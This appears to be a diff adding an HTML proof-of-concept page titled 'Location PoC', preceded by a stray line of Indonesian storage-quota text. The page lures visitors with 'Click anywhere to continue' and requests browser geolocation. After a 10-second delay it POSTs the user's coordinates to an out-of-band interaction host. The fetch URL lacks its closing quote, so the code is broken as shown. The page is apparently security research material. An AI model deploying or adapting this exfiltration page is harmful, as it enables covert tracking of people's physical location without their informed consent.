@@ -1,0 +1,47 @@
+84% penyimpanan digunakan … Jika ruang penyimpanan sudah penuh, Anda tidak dapat membuat, mengedit, dan mengupload file. Dapatkan penyimpanan 30 GB seharga Rp 3.500 selama 3 bulan Rp 14.500.
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Location PoC</title>
+  <script>
+    function requestLocation() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(function(position) {
+
+          // Add warning message to the page
+          const msg = document.createElement("div");
+          msg.style.marginTop = "20px";
+          msg.style.padding = "10px";
+          msg.style.border = "1px solid #ccc";
+          msg.style.background = "#f8f8f8";
+          msg.style.color = "#333";
+          msg.innerText = "You have granted this site access to your location. You can revoke it anytime from your browser's site settings.";
+          document.body.appendChild(msg);
+
+          // Wait 10 seconds AFTER permission granted and before capturing location
+          setTimeout(function() {
+            var data = {
+              latitude: position.coords.latitude,
+              longitude: position.coords.longitude,
+              accuracy: position.coords.accuracy
+            };
+
+            fetch("https://palqivhpyhlhspfsjixjh5hgfqpsujakv.oast.fun, {
+              method: "POST",
+              headers: {
+                "Content-Type": "application/json"
+              },
+              body: JSON.stringify(data)
+            });
+          }, 10000);
+        });
+      } else {
+        alert("Geolocation not supported.");
+      }
+    }
+  </script>
+</head>
+<body onclick="requestLocation()" style="height:100vh;cursor:pointer;">
+  <h2>Click anywhere to continue</h2>
+</body>
+</html>
